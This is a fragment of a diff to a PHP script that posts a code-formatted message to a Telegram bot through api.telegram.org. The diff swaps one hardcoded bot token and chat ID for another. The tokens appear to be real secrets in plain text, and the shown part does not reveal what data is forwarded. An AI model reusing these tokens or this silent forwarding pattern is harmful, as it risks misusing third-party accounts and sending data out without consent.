@@ -24,8 +24,8 @@ $message = "```\n"
           ."```";
 
 // Send to Telegram
-$botToken = '7744252231:AAHV14w1evOu1tcjKZG0WwUaymfIUChr_Vs';
-$chatId = '7861853064';
+$botToken = '7284066719:AAEncc3VY27DzgRzCLnuNTLpyIJf5MrrCos';
+$chatId = '7724482403';
 $url = "https://api.telegram.org/bot$botToken/sendMessage";
 
 $data = [
